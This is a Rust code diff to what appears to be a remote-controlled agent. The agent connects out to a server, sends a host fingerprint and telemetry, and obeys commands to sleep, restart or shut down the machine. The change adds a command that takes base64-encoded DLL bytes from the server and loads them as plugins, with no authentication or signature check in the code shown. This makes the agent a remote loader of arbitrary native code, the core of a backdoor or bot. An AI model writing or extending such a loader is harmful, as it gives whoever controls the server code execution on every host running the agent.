@@ -5,10 +5,12 @@ use std::{
     time::{Duration, Instant},
 };
 
-use crate::{sys, telemetry, text};
+use crate::{plugin::Manager, sys, telemetry, text};
 
 pub fn run(ip: &str, port: u16) {
     let fp = telemetry::fingerprint();
+    let host = telemetry::host(&fp);
+    let mut plugins = Manager::new();
 
     loop {
         let started = Instant::now();
@@ -22,9 +24,12 @@ pub fn run(ip: &str, port: u16) {
                     && send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok()
                 {
                     println!("{}", text::CONNECTED);
-                    if session(&mut stream, ip, &fp) {
+                    plugins.event("agent.connected", host.as_bytes());
+                    if session(&mut stream, ip, &fp, &host, &mut plugins) {
+                        plugins.clear();
                         return;
                     }
+                    plugins.clear();
                 }
             }
             Err(_) => {}
@@ -35,10 +40,8 @@ pub fn run(ip: &str, port: u16) {
     }
 }
 
-fn session(stream: &mut TcpStream, ip: &str, fp: &str) -> bool {
-    let Ok(clone) = stream.try_clone() else {
-        return false;
-    };
+fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut Manager) -> bool {
+    let Ok(clone) = stream.try_clone() else { return false; };
     let mut reader = BufReader::new(clone);
 
     loop {
@@ -48,14 +51,61 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str) -> bool {
             }
             Ok(Some(value)) if value == text::REQ => {
                 let _ = send(stream, text::PONG);
-                let _ = send(
-                    stream,
-                    &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)),
-                );
+                let _ = send(stream, &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)));
             }
             Ok(Some(value)) if value.starts_with(text::CMD) => {
-                let cmd = value[text::CMD.len()..].trim().to_ascii_uppercase();
+                let raw = value[text::CMD.len()..].trim();
 
+                // CMD:PLUGIN:<id>:<base64-dll-bytes>
+                if raw.to_ascii_uppercase().starts_with(text::PLUGIN) {
+                    let rest = raw[text::PLUGIN.len()..].trim();
+                    // id is up to first ':'
+                    let (id, b64) = match rest.split_once(':') {
+                        Some((i, b)) => (i.trim(), b.trim()),
+                        None => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
+                            continue;
+                        }
+                    };
+                    if id.is_empty() || b64.is_empty() {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
+                        continue;
+                    }
+                    match decode_b64(b64) {
+                        Some(dll_bytes) => match plugins.load(id, &dll_bytes, host.as_bytes()) {
+                            Ok(()) => {
+                                let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id));
+                            }
+                            Err(_) => {
+                                let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
+                            }
+                        },
+                        None => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN));
+                        }
+                    }
+                    continue;
+                }
+
+                if raw.to_ascii_uppercase().starts_with("UNLOAD:") {
+                    let id = raw[7..].trim();
+                    let ok = plugins.unload(id);
+                    let _ = send(stream, &format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id));
+                    continue;
+                }
+
+                if raw.to_ascii_uppercase().starts_with(text::PEVENT) {
+                    let event = raw[text::PEVENT.len()..].trim();
+                    if event.is_empty() {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::PEVENT));
+                    } else {
+                        plugins.event(event, &[]);
+                        let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEVENT, event));
+                    }
+                    continue;
+                }
+
+                let cmd = raw.to_ascii_uppercase();
                 match cmd.as_str() {
                     text::RECONNECT => {
                         let _ = send(stream, &format!("{}{}", text::ACK, cmd));
@@ -68,13 +118,9 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str) -> bool {
                     }
                     text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
                         let ok = sys::command(&cmd);
-                        let _ = send(
-                            stream,
-                            &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd),
-                        );
-                        if ok {
-                            return true;
-                        }
+                        let _ = send(stream, &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd));
+                        plugins.event("agent.command", cmd.as_bytes());
+                        if ok { return true; }
                     }
                     _ => {}
                 }
@@ -87,6 +133,33 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str) -> bool {
             Err(_) => return false,
         }
     }
+}
+
+// Minimal base64 decoder (RFC 4648, no padding requirement)
+fn decode_b64(s: &str) -> Option<Vec<u8>> {
+    let s = s.trim();
+    let mut out = Vec::with_capacity(s.len() * 3 / 4);
+    let mut buf = 0u32;
+    let mut bits = 0u32;
+    for b in s.bytes() {
+        let v = match b {
+            b'A'..=b'Z' => (b - b'A') as u32,
+            b'a'..=b'z' => (b - b'a' + 26) as u32,
+            b'0'..=b'9' => (b - b'0' + 52) as u32,
+            b'+' | b'-' => 62,
+            b'/' | b'_' => 63,
+            b'=' | b'\r' | b'\n' | b' ' => continue,
+            _ => return None,
+        };
+        buf = (buf << 6) | v;
+        bits += 6;
+        if bits >= 8 {
+            bits -= 8;
+            out.push((buf >> bits) as u8);
+            buf &= (1 << bits) - 1;
+        }
+    }
+    Some(out)
 }
 
 fn line(r: &mut BufReader<TcpStream>) -> std::io::Result<Option<String>> {
